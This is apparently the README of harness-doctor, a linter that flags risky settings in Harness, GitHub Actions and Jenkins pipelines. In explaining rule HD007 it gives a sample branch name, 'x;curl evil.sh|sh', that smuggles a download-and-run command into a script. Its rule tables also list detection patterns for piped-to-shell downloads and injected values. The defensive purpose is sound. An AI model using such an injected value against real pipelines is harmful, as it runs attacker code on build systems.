# harness-doctor

[![CI](https://github.com/gerardrecinto/harness-doctor/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/gerardrecinto/harness-doctor/actions/workflows/ci.yml)
[![License](https://img.shields.io/github/license/gerardrecinto/harness-doctor)](LICENSE)

harness-doctor is a command-line tool that reads your CI/CD pipeline files and points out risky settings, with the line number and a fix. It is for people who write or review pipelines in Harness, GitHub Actions or Jenkins.

New here? It reads your pipeline files and warns you about risky settings before they cause a problem.

## Try it in 60 seconds

You need Git and Python 3.10 or newer, available as `python3`. Run these commands in a macOS or Linux shell to install from the current `main` branch and lint a deliberately bad example.

```
git clone https://github.com/gerardrecinto/harness-doctor && cd harness-doctor
python3 -m venv .venv && . .venv/bin/activate
pip install .
harness-doctor check examples/bad/deploy.yaml
```

Output (trimmed):

```
    35  error    HD001  env var 'NPM_TOKEN' in step 'tag_release' holds a literal value
                         fix: use <+secrets.getValue("npm_token")>
    35  warning  HD003  image 'node:latest' in step 'tag_release' uses the latest tag
                         fix: pin a version tag or an @sha256 digest
    47  error    HD005  stage 'deploy_prod' deploys to 'prod' with no approval before it
                         fix: add a HarnessApproval stage ahead of this one

2 errors, 5 warnings, 1 info in 1 file
```

The command exits with code 1 because it found errors. `harness-doctor check examples/good` finds nothing and exits 0. To lint your own files, point `check` at a folder such as `.harness` or `.github/workflows`.

There is also a browser demo that runs the same code, with nothing uploaded: https://gerardrecinto.github.io/harness-doctor/

## What it does and does not do

- It checks 25 rules: 9 for Harness pipelines, 9 for GitHub Actions workflows and 7 for Jenkinsfiles. Examples are a literal token, an image tagged `latest`, a production deploy with no approval, and untrusted text pasted into a script.
- It reads one file at a time. It does not call Harness, resolve templates or runtime inputs, or know which secrets exist in your account.
- A secret that does not look like a secret by name or format is not flagged.
- It is a linter, not proof that a pipeline is safe.
- The GitHub Actions and Jenkins rules are on `main` but not in the v0.1.1 release. Installing from `main`, as above, includes them. The v0.1.1 release and the GitHub Action pinned to it check Harness files only.
- Jenkins checks read the Groovy text, so a pipeline that builds its stages dynamically can hide a finding.

## More

<details>
<summary>Harness rules (HD001 to HD009)</summary>

Each row is one mistake the tool looks for in Harness pipelines.

| Rule | Severity | Catches |
|------|----------|---------|
| HD001 | error | Literal secrets in env vars, `String` variables, or credential-shaped strings |
| HD002 | warning | Steps with no `timeout` |
| HD003 | warning | Images with no tag, `:latest`, anything not pinned |
| HD004 | warning | Deployment stages with no rollback path |
| HD005 | error | Production deploys with no approval stage ahead of them |
| HD006 | warning | `curl ... \| sh` |
| HD007 | warning | Branch names, PR titles or commit messages interpolated into a script |
| HD008 | warning | `privileged: true` |
| HD009 | info | CI stages that run steps with no caching |

`harness-doctor explain HD007` says why a rule exists. HD007 is the one most teams miss: Harness substitutes `<+codebase.branch>` into the script text before the shell parses it, so a branch named `x;curl evil.sh|sh` runs as code. Pass it through `envVariables` and read it quoted.

```
examples/bad/deploy.yaml
    14  info     HD009  CI stage 'build' runs steps with no caching
                         fix: set spec.caching.enabled: true or add a Save/Restore Cache step
    28  warning  HD002  step 'install_tools' (Run) has no timeout
                         fix: add timeout: 10m
    28  warning  HD006  step 'install_tools' pipes a download into a shell
                         fix: download to a file, check its sha256, then execute
    35  error    HD001  env var 'NPM_TOKEN' in step 'tag_release' holds a literal value
                         fix: use <+secrets.getValue("npm_token")>
    35  warning  HD003  image 'node:latest' in step 'tag_release' uses the latest tag
                         fix: pin a version tag or an @sha256 digest
    35  warning  HD007  step 'tag_release' puts <+codebase.branch> directly in the script
                         fix: pass it through envVariables and read it quoted: "$VAR"
    47  warning  HD004  stage 'deploy_prod' deploys with no rollback
                         fix: add rollbackSteps or a StageRollback failure strategy
    47  error    HD005  stage 'deploy_prod' deploys to 'prod' with no approval before it
                         fix: add a HarnessApproval stage ahead of this one

2 errors, 5 warnings, 1 info in 1 file
```

</details>

<details>
<summary>GitHub Actions and Jenkins rules (GA001 to GA009, JK001 to JK007)</summary>

The same command checks `.github/workflows/*.yml` and any file named `Jenkinsfile*`, picking the rule set from the file itself. `harness-doctor check .github/workflows Jenkinsfile` runs both.

| Rule | Severity | Catches |
|------|----------|---------|
| GA001 | warning | A third-party action pinned to a tag instead of a commit SHA (`actions/*` and `github/*` are skipped) |
| GA002 | warning | A workflow with no `permissions` block, so the token gets the repository default |
| GA003 | error | `${{ github.event.pull_request.title }}`, `github.head_ref` and similar attacker-controlled values written into a `run:` or `github-script` body |
| GA004 | error | `pull_request_target` that checks out the pull request's head |
| GA005 | error | `permissions: write-all` |
| GA006 | warning | `${{ secrets.X }}` written into a script instead of passed through `env:` |
| GA007 | warning | A self-hosted runner on a pull request trigger |
| GA008 | info | A job with no `timeout-minutes` |
| GA009 | warning | `curl ... \| sh` in a step |
| JK001 | error | A password, token or key literal in the Jenkinsfile |
| JK002 | warning | `agent any` |
| JK003 | warning | A declarative pipeline with no `timeout` |
| JK004 | warning | A double-quoted `sh` step that interpolates `params.*`, `env.BRANCH_NAME`, `CHANGE_TITLE` and similar |
| JK005 | warning | A container image with no tag, `:latest`, or no digest |
| JK006 | error | A stage that deploys to production with no `input` approval in or before it |
| JK007 | warning | `curl ... \| sh` in a step |

```
examples/bad/workflow.yml
     5  error    GA005  workflow grants write-all permissions
    12  error    GA004  job 'build' checks out the PR head under pull_request_target
    13  warning  GA001  'someorg/deploy-action@v2' is pinned to 'v2', not a commit SHA
    14  error    GA003  ${{ github.event.pull_request.title }} is interpolated into a script
```

Jenkins checks read the Groovy text, not a parsed model, so they target declarative pipelines written in the usual style; a Jenkinsfile that builds its stages dynamically can hide a finding. Suppress one with `// harness-doctor: ignore JK002` above the line. `harness-doctor schema` validates Harness files only and skips the rest.

</details>

<details>
<summary>Commands, output formats and suppressing a finding</summary>

These commands change how strict the check is and how the results are shown. SARIF is a standard report file that GitHub reads to show problems in its Security tab.

```
harness-doctor check .harness                       # exit 1 on any error
harness-doctor check .harness --fail-on warning     # stricter
harness-doctor check .harness --ignore HD009
harness-doctor check .harness --format sarif        # for GitHub code scanning
harness-doctor check .harness --format json
harness-doctor check .harness --format github       # inline annotations on the PR diff
harness-doctor schema .harness                      # validate against Harness's published JSON schema
```

Silence one finding with a comment on the line, or either of the two lines above it:

```yaml
# harness-doctor: ignore HD002
- step:
```

Exit codes: `0` clean, `1` findings at or above `--fail-on`, `2` bad input.

</details>

<details>
<summary>GitHub Action and pre-commit</summary>

These run the check for you on every pull request or every commit.

```yaml
permissions:
  contents: read
  security-events: write

steps:
  - uses: actions/checkout@v7
  - uses: gerardrecinto/harness-doctor@v0.1.1
    with:
      path: .harness
      fail-on: warning
      schema: "true"
```

Findings show up as annotations on the pull request and, through SARIF, in the Security tab. The SARIF upload needs `security-events: write` and code scanning on the repo. On fork pull requests and private repos without it, the upload is skipped with a warning and the lint result still decides the job. Set `sarif: "false"` to turn it off.

### pre-commit

```yaml
repos:
  - repo: https://github.com/gerardrecinto/harness-doctor
    rev: v0.1.1
    hooks:
      - id: harness-doctor
```

</details>

<details>
<summary>Harness policy (OPA)</summary>

This makes Harness itself refuse to save a risky pipeline.

[`policies/pipeline_guardrails.rego`](policies/pipeline_guardrails.rego) enforces the image, timeout and prod-approval rules inside Harness itself. Add it to a policy set on the Pipeline entity, "On Save", and the save fails instead of waiting for someone to notice. It has OPA tests: `opa test --v0-compatible policies`.

</details>

<details>
<summary>The pipelines in .harness/</summary>

The [`.harness/`](.harness) folder contains example CI and release pipelines for a Harness account. GitHub Actions lints and schema-checks these files on every push and pull request. A passing schema check does not verify a run inside Harness.

| File | What it shows |
|------|---------------|
| `templates/python_quality_stage.yaml` | A reusable CI stage template with a runtime-input variable and `allowedValues` |
| `pipelines/ci.yaml` | Two template stages in parallel (Python 3.10, 3.13), then a dogfood stage that lints and schema-checks the pipelines themselves |
| `pipelines/release.yaml` | Approval stage, then build and publish with the token pulled from a Harness secret |
| `triggers/pull_request.yaml` | PR webhook with `autoAbortPreviousExecutions` |
| `triggers/release.yaml` | GitHub release webhook that passes the tag into the build |

CI also runs on GitHub Actions ([`ci.yml`](.github/workflows/ci.yml)): tests on Python 3.10 to 3.13, ruff, the OPA tests, and `harness-doctor schema` over every pipeline file. Every file in `.harness/` validates against Harness's published schema.

To run them in your own account: import the folder with Git Experience, then create a GitHub connector with the identifier `github` at account level and a secret named `pypi_token`. Both are placeholders in the YAML.

</details>

<details>
<summary>Develop</summary>

```
python3 -m venv .venv && .venv/bin/pip install -e '.[dev]'
.venv/bin/pytest -q
.venv/bin/ruff check src tests
```

To add a rule, write a function in `src/harness_doctor/rules.py` decorated with `@rule(...)` that yields `(line, message, hint)`, and add a case to `tests/test_rules.py`.

</details>

Changelog: [CHANGELOG.md](CHANGELOG.md). Contributing: [.github/CONTRIBUTING.md](.github/CONTRIBUTING.md). MIT licensed.
